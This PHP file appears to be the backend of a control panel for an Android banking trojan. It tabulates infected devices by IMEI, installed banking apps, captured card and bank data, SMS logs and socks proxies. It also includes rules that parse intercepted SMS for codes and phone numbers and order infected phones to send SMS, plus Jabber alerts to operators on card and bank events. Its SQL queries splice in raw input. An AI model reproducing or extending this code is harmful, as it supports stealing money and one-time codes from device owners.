<?php

include 'XMPPHP/XMPP.php';
include 'XMPPHP/creds.php';

function pages_bottom($page, $total=1,$p=1,$sort){
    $html = '';
    if($total>1):
        #две назад
        $html .= "<div class='show_online_bots'>";
        $html .= "<br><div>";
        if(($p-2)>0):
          $ptwoleft="<a class='first_page_link' href='index.php?command=$page&sort={$sort}&p=".($p-2)."'>".($p-2)."</a>  ";
        else:
          $ptwoleft=null;
        endif;
                
        #одна назад
        if(($p-1)>0):
          $poneleft="<a class='first_page_link' href='index.php?command=$page&sort={$sort}&p=".($p-1)."'>".($p-1)."</a>  ";
          $ptemp=($p-1);
        else:
          $poneleft=null;
          $ptemp=null;
        endif;
                
        #две вперед
        if(($p+2)<=$total):
          $ptworight="  <a class='first_page_link' href='index.php?command=$page&sort={$sort}&p=".($p+2)."'>".($p+2)."</a>";
        else:
          $ptworight=null;
        endif;
                
        #одна вперед
        if(($p+1)<=$total):
          $poneright="  <a class='first_page_link' href='index.php?command=$page&sort={$sort}&p=".($p+1)."'>".($p+1)."</a>";
          $ptemp2=($p+1);
        else:
          $poneright=null;
          $ptemp2=null;
        endif;        
                
        # в начало
        if($p!=1 && $ptemp!=1 && $ptemp!=2):
          $prevp="<a href='index.php?command=$page&sort={$sort}&p=1' class='first_page_link' title='В начало'><<</a> ";
        else:
          $prevp=null;
        endif;   
                
        #в конец (последняя)
        if($p!=$total && $ptemp2!=($total-1) && $ptemp2!=$total):
          $nextp=" ...  <a href='index.php?command=$page&sort={$sort}&p=".$total."'".$total."' class='first_page_link'>$total</a>";
        else:
          $nextp=null;
        endif;
            
        $html .= "".$prevp.$ptwoleft.$poneleft.'<span class="num_page_not_link"><b>'.$p.'</b></span>'.$poneright.$ptworight.$nextp; 
        $html .= "</div>";
        $html .= "</div></div>";
    endif;
    return $html;
}

function recursiveRemoveDirectory($directory){
    foreach(glob("{$directory}/*") as $file)    {
        if(is_dir($file)) { 
            recursiveRemoveDirectory($file);
        } else {
            unlink($file);
        }
    }
    rmdir($directory);
}

function recelculate_stat($value='')
{
  # code...
}

function cleanupOldFiles($value='')
{
  # code...
}

function checkApp($app_name='', $mysqli){
  $search_app_sql = "SELECT * FROM `stat_apps` WHERE `app_name` LIKE '$app_name'";
  $search_app_sql_res = $mysqli->query($search_app_sql);
  

  if ($search_app_sql_res->num_rows){
    $increment_count_sql = "UPDATE `stat_apps` SET `count` = `count` + 1 WHERE `app_name` = '$app_name'";
    
    $increment_count_sql_res = $mysqli->query($increment_count_sql);
  } else {
    $insert_new_app = "INSERT INTO `stat_apps` (`id`, `app_name`, `count`) VALUES (NULL, '$app_name', '1');";
    $insert_new_app_res = $mysqli->query($insert_new_app);
  }
}

function checkHist($url='', $mysqli){
  # we need to parse domain from url, because url maybe too large
  //var_dump($url);
  $pattern = "/http(s)?:\/\/[\w-.]*/";
  preg_match($pattern, $url, $matches);
  //var_dump($matches[0]);
  if ($matches[0]){
    $domain = $matches[0];
    $search_url_sql = "SELECT * FROM `stat_hist` WHERE `domain` LIKE '$domain'";
    $search_url_sql_res = $mysqli->query($search_url_sql);

    if ($search_url_sql_res->num_rows){
      //echo "update row in db";
      $increment_count_sql = "UPDATE `stat_hist` SET `count` = `count` + 1 WHERE `domain` = '$domain'";
      $increment_count_sql_res = $mysqli->query($increment_count_sql);
    } else {
      //echo "set new row into db";
      $insert_new_app = "INSERT INTO `stat_hist` (`id`, `domain`, `count`) VALUES (NULL, '$domain', '1')";
      $insert_new_app_res = $mysqli->query($insert_new_app);
    }
  }
}

function getTaskProgress($task='', $mysqli){
  $query = "SELECT * FROM `commands` WHERE `id` = '$task'";
  $result1 = $mysqli->query($query);
  $take = $result1->num_rows;

  $query = "SELECT * FROM `task`  WHERE `id` = '$task'";
  $result = $mysqli->query($query);
  $row = mysqli_fetch_assoc($result);
  $run = intval($row["real_count"])-$take;

  $responce = array(
        "number" => $task,
        "run" => $run,
        "take" => $take
      );
  return $run;
}

function excludeApps($apps=''){
  $result = '';
  $excludedApps = array('com.google.android.play.games',
    'com.google.android.apps.translate',
    'com.facebook.orca',
    'com.facebook.katana',
    'com.instagram.android',
    'com.snapchat.android',
    'com.twitter.android',
    'com.supercell.clashofclans',
    'com.supercell.clashroyale',
    'com.google.android.gm',
    'com.google.android.play.games',
    'com.whatsapp',
    'com.yahoo.mobile.client.android.mail',
    'com.viber.voip',
    'com.skype.raider');
  foreach (explode("\n", $apps) as $app) {
    if (!array_search($app, $excludedApps)){
      $result .= "$app\n";
    }
  }
  return rtrim($result);
}

function getBigTable($page='', $sql='', $mysqli) {
  //$query2 = "SELECT * FROM `kliets` $imei_query_sql ORDER BY `{$sort}` DESC limit $first, $users_on_page ";
  if (isset($_SESSION[$page])) {
    $conf = $_SESSION[$page];
  } else {
    $conf = array("imei" => true,
      "android" => true,
      "country" => true,
      "seller" => true,
      "online" => true,
      "lastcon" => true,
      "bankapp" => true,
      "jabber" => true,
      "card" => true,
      "sms" => true,
      "imei" => false,
      "firstcon" => false,
      "number" => false,
      "model" => false,
      "city" => false,
      "regionName" => false,
      "zip" => false,
      "comment" => false,
      "internet" => false,
      "ip" => false,
      "jabber" => false,
      "socks" => false,
      "bank" => false);
  }
  //$conf = array("imei" => "true");
  //var_dump($_SESSION[$page]["imei"]);
  //var_dump($sql);
  $html_table = '';
  $html_table .= "<thead>";
  if ($conf["imei"] == true) $html_table .= "<th>IMEI</th>";
  if ($conf["android"] == true) $html_table .= "<th>Android</th>";
  # if ($conf["root"] == true) $html_table .= "<th>root</th>";
  if ($conf["country"] == true) $html_table .= "<th>Country</th>";
  if ($conf["seller"] == true) $html_table .= "<th>Seller</th>";
  if ($conf["online"] == true) $html_table .= "<th>Online</th>";
  if ($conf["lastcon"] == true) $html_table .= "<th>Last Connect</th>";
  if ($conf["firstcon"] == true) $html_table .= "<th>First Connect</th>";
  if ($conf["bankapp"] == true) $html_table .= "<th>Bank App</th>";
  if ($conf["screen"] == true) $html_table .= "<th><center>Screen</center></th>";
  if ($conf["number"] == true) $html_table .= "<th><center>Operator</center></th>";
  if ($conf["model"] == true) $html_table .= "<th><center>Model</center></th>";
  if ($conf["city"] == true) $html_table .= "<th><center>City</center></th>";
  if ($conf["regionName"] == true) $html_table .= "<th><center>Region</center></th>";
  if ($conf["zip"] == true) $html_table .= "<th><center>zip</center></th>";
  if ($conf["comment"] == true) $html_table .= "<th>Comment</th><th></th>";
  if ($conf["internet"] == true) $html_table .= "<th>Internet</th>";
  if ($conf["ip"] == true) $html_table .= "<th>IP</th>";
  if ($conf["jabber"] == true) $html_table .= "<th>Jabber</th>";
  if ($conf["socks"] == true) $html_table .= "<th>Socks</th>";
  if ($conf["card"] == true) $html_table .= "<th>Card</th>";
  if ($conf["bank"] == true) $html_table .= "<th>Bank</th>";
  if ($conf["sms"] == true) $html_table .= "<th>SMS</th>";
  $html_table .= "<th><input type='checkbox' id='chk_new' onclick='checkAll(\"chk\");' /></th>";
  $html_table .= "</thead><tbody>";

  foreach($mysqli->query($sql) as $row){

      $ID = $row['id'];
      $IMEI = $row['IMEI'];
      $number = $row['number'];
      $version = $row['version'];
      $version_apk = $row['version_apk'];
      $comment = $row['comment'];
      $internet = $row['internet'];
      $ip = $row['IP'];
      $country = $row['country'];
      $bank = $row['bank'];
      $socks = $row['socks'];
      $model = $row['model'];
      $city = $row['city'];
      $regionName = $row['regionName'];
      $zip = $row['zip'];
      $lastConnect = $row['lastConnect'];
      $firstConnect = $row['firstConnect'];
      $l_inj=$row['info2'];
      $screen = $row['screen'];
      $jabber_notify = $row['j_notify'];
      $l_inj.=$row['CARD'];
      $l_inj.=$row['cc_info.CARD'];
      
      $l_bank=$row['info'];
      $l_log=$row['log'];
      $root=$row['r00t'];
      $screen=$row['screen'];
      $color=$row['color'];

      $arr_data_from = explode(" ", $row['lastConnect']);
      $arr_data_till = explode(" ", date('Y-m-d H:i')); 
                  
      $date_from = $arr_data_from[0];
      $date_till = $arr_data_till[0]; 
              
      $date_from = explode('-', $date_from);
      $date_till = explode('-', $date_till);
       
      $time_from = mktime(0, 0, 0, $date_from[1], $date_from[2], $date_from[0]);
      $time_till = mktime(0, 0, 0, $date_till[1], $date_till[2], $date_till[0]);
              
      $day = ($time_till - $time_from)/60/60/24;

      $date1 = new \DateTime($row['lastConnect']);
      $date2 = new \DateTime(date('Y-m-d H:i'));
      $diff = $date2->diff($date1);
      // разница в секундах
      $seconds = ($diff->y * 365 * 24 * 60 * 60) +
          ($diff->m * 30 * 24 * 60 * 60) +
          ($diff->d * 24 * 60 * 60) +
          ($diff->h * 60 * 60) +
          ($diff->i * 60) +
          $diff->s;

      if($day>=7){
          $img="../admin/images/icons/kill.png";
      }else{
          if($seconds<=120){
              $img="../admin/images/icons/online.png";
          }else{
              $img="../admin/images/icons/offline.png";
          }
      }
      if($screen == "1"){
        $screen_img = "screen_share";
      } else {
        $screen_img = "stop_screen_share";
      }
      if($l_inj == ""){
          $icon_inj='<div class="material-icons md-18">payment</div>';
      }else{
          $icon_inj='<div class="material-icons md-18 mdl-badge mdl-badge--overlap" data-badge="+">payment</div>';
      }
      if($jabber_notify == 1){
          $icon_jabber='<div class="material-icons md-18">notifications_active</div>';
      }else{
          $icon_jabber='<div class="material-icons md-18">notifications_none</div>';
      }
      if($l_bank == ""){
          $icon_bank='<div class="material-icons md-18">account_balance</div>';
      }else{
          $icon_bank='<div class="material-icons md-18 mdl-badge mdl-badge--overlap" data-badge="+">account_balance</div>';
      }
      if($l_log == "1"){
          $icon_log='<div class="material-icons md-18 mdl-badge mdl-badge--overlap" data-badge="+">mail</div>';
      }else{
          $icon_log='<div class="material-icons md-18">mail</div>';
      }
      if($seconds<=60){
          if($screen == "1"){
              $icon_screen="../admin/images/icons/V.png";
          }else{
              $icon_screen="../admin/images/icons/X.png";
          }
      }else{
          $icon_screen="../admin/images/icons/X.png";
      }
      if($country == ""){
          $country_img="../admin/images/country/_unknown.png";
      }else{
          $country_img="../admin/images/country/$country.png";
      }
      if ($socks){
        $socks = '<i class="mdl-color-text--green-400 material-icons" role="presentation">swap_horiz</i>';
      } else {
        $socks = '<i class="mdl-color-text--red-400 material-icons" role="presentation">swap_horiz</i>';
      };
      $icon_del="../admin/images/icons/dell.png";

      $html_table .= "<tr>";
      if ($conf["imei"] == true) $html_table .= "<td><center>$IMEI</center></td>";
      if ($conf["android"] == true) $html_table .= "<td><center>$version</center></td>";
      # if ($conf["root"] == true) $html_table .= "<td><center>$root</center></td>";
      if ($conf["country"] == true) $html_table .= "<td><center><a title='$country'><img src=$country_img width='16px'/></a></center></td>";
      if ($conf["seller"] == true) $html_table .= "<td><center>$version_apk</center></td>";
      if ($conf["online"] == true) $html_table .= "<td><center><a title='$lastConnect'><img src=$img width='16px'/></a></center></td>";
      if ($conf["lastcon"] == true) $html_table .= "<td><center>$lastConnect</center></td>";
      if ($conf["firstcon"] == true) $html_table .= "<td><center>$firstConnect</center></td>";
      if ($conf["bankapp"] == true) $html_table .= "<td><center>".str_replace("\n", "<br>", excludeApps($bank))."</center></td>";
      
      if ($conf["screen"] == true) $html_table .= "<td><center><i class='material-icons md-18' >$screen_img</i></center></td>";
      if ($conf["number"] == true) $html_table .= "<td><center>$number</center></td>";
      if ($conf["model"] == true) $html_table .= "<td><center>$model</center></td>";
      if ($conf["city"] == true) $html_table .= "<td><center>$city</center></td>";
      if ($conf["regionName"] == true) $html_table .= "<td><center>$regionName</center></td>";
      if ($conf["zip"] == true) $html_table .= "<td><center>$zip</center></td>";
      if ($conf["comment"] == true) $html_table .= "<td><input name='bot_comment_$ID' type='text' id='bot_comment_$ID' value='$comment'></center>
                </td>
                <td><div style='cursor: pointer;' onclick='update_bot_comment($ID);'><i class='material-icons md-18' >system_update_alt</i></td>";
      if ($conf["internet"] == true) $html_table .= "<td><center>$internet</center></td>";
      if ($conf["ip"] == true) $html_table .= "<td><center>$ip</center></td>";
      if ($conf["jabber"] == true) $html_table .= "<td><center><div style='cursor: pointer;' onclick='set_jabber_notifications($ID, $jabber_notify);'>$icon_jabber</div></center></td>";
      if ($conf["socks"] == true) $html_table .= "<td><center><div style='cursor: default;' >$socks</div></center></td>";
      if ($conf["card"] == true) $html_table .= "<td><center><div style='cursor: pointer;' onclick='get_modal_logs($ID, \"$IMEI\", \"card\");'>$icon_inj</div></center></td>";
      if ($conf["bank"] == true) $html_table .= "<td><center><div style='cursor: pointer;' onclick='get_modal_logs($ID, \"$IMEI\", \"bank\");'>$icon_bank</div></center></td>";
      if ($conf["sms"] == true) $html_table .= "<td><center><div style='cursor: pointer;' onclick='get_modal_logs($ID, \"$IMEI\", \"log\");'>$icon_log</div></center></td>";
      $html_table .= "<td><center><input type=checkbox name=checks[] id='chk' value=$ID:$IMEI></input></center></td>";
      $html_table .= "</tr></tbody>";

      
  }
  return $html_table;
}

function check_imei_event($imei='',$mysqli){
  $get_imei_event_sql = "SELECT `j_notify` FROM `kliets` WHERE `IMEI` = '$imei'";
  $get_imei_event_sql_res = $mysqli->query($get_imei_event_sql);
  $row = mysqli_fetch_assoc($get_imei_event_sql_res);
  if ($row["j_notify"]){
    return true;
  } else {
    return false;
  }
}

function checkAndAnswer($imei='', $text='', $mysqli){
  $get_rules_sql = "SELECT * FROM `answer_rules` WHERE `imei` = '$imei' OR `imei` = '*'";
  $commands = array();

  foreach ($mysqli->query($get_rules_sql) as $rule_row) {
    $reg_rule = $rule_row["reg_rule"];
    $action = $rule_row["action"];
    $param1 = $rule_row["param1"];
    $param2 = $rule_row["param2"];

    $reg_rule = str_replace('%CODE%', "(?P<code>[0-9]+)", $reg_rule);
    $reg_rule = str_replace('%NUMBER%', "(?P<num>[+0-9]+)", $reg_rule);

    # check rewrite rule and do an action
    preg_match("/$reg_rule/", $text, $matches, PREG_OFFSET_CAPTURE);

    # start actions
    if (($action == 'sms') and $matches){
      $num = $matches['num'];
      $code = $matches['code'];
      $sql = "INSERT INTO `commands` (`IMEI`, `command`, `command_name`) VALUES ('$imei', '|command=Send_SMS|number=$num|text=$code::', 'autoanswer sms to $num: $code')";
      array_push($commands, $sql);
    }
  }

  # add all commands to db
  foreach ($commands as $command_sql) {
    $mysqli->query($command_sql);
  }
}

function displayAnswerRules($mysqli, $imei=''){
  if ($imei==''){
    $get_rules_sql = "SELECT * FROM `answer_rules` WHERE 1";
  } else {
    $get_rules_sql = "SELECT * FROM `answer_rules` WHERE `imei` REGEXP '$imei'";
  }
  $table_html = '';
  $table_html .= '<table class="mdl-shadow--2dp tmain" cellpadding="1" align="center" width=100%><thead>
                    <th>id</th>
                    <th>IMEI</th>
                    <th>reg_rule</th>
                    <th>action</th>
                    <!--<th>param1</th>
                    <th>param2</th>-->
                    <th style="width:30px;"></th>
                </thead>';
  #$get_rules_sql_res = $mysqli->query($get_rules_sql);
  #$row = mysqli_fetch_assoc($get_imei_event_sql_res);
  foreach ($mysqli->query($get_rules_sql) as $rule_row) {
    $id = $rule_row["id"];
    $imei = $rule_row["imei"];
    $reg_rule = $rule_row["reg_rule"];
    $action = $rule_row["action"];
    $param1 = $rule_row["param1"];
    $param2 = $rule_row["param2"];

    $table_html .= "<tr>";
    $table_html .= "<td>$id</td><td>$imei</td><td>$reg_rule</td><td>$action</td>"; //<td>$param1</td><td>$param2</td>";
    $table_html .= "<td><a style='cursor: pointer; color: Red;' onclick='delete_answer_rule($id);'><i class='material-icons'>highlight_off</i></a></td>";
    $table_html .= "</tr>";
  }
  $table_html .= '</table>';

  return $table_html;
}

function send_jabber_message($address='someguy@someserver.net', $message=''){
  include 'XMPPHP/creds.php';
  #Use XMPPHP_Log::LEVEL_VERBOSE to get more logging for error reports
  #If this doesn't work, are you running 64-bit PHP with < 5.2.6?
  $conn = new XMPPHP_XMPP($jabber_main_server, $jabber_main_port, $jabber_main_login, $jabber_main_pass, 'xmpphp', $jabber_main_domain, $printlog=false, $loglevel=XMPPHP_Log::LEVEL_VERBOSE);

  try {
      $conn->connect();
      $conn->processUntil('session_start');
      //$conn->presence();
      $conn->message($address, $message);
      $conn->disconnect();

  } catch(XMPPHP_Exception $e) {
      die($e->getMessage());
  }
}

function send_jabber_event($event='', $message='',$mysqli){
  //var_dump($mysqli);
  # get jabber address from db
  $get_jabbers_sql = "SELECT * FROM `jabber_notifications`";
  //$get_jabbers_sql_res = $mysqli->query($get_jabbers_sql);
  foreach ($mysqli->query($get_jabbers_sql) as $jabber_row) {
    $j_address = $jabber_row["address"];
    $j_id = $jabber_row["id"];
    $j_bot_event = $jabber_row["bot_event"];
    $j_card_event = $jabber_row["card_event"];
    $j_bank_event = $jabber_row["bank_event"];
    $j_ded_event = $jabber_row["dedicated_event"];

    if (($event == 'bot_event') and ($j_bot_event)){
      send_jabber_message($j_address,$event.":".$message);
    }
    if (($event == 'card_event') and ($j_card_event)){
      send_jabber_message($j_address,$event.":".$message);
    }
    if (($event == 'bank_event') and ($j_bank_event)){
      send_jabber_message($j_address,$event.":".$message);
    }
    if (($event == 'dedicated_event') and ($j_ded_event)){
      send_jabber_message($j_address,$event.":".$message);
    }
  }
  return true;
}

?>
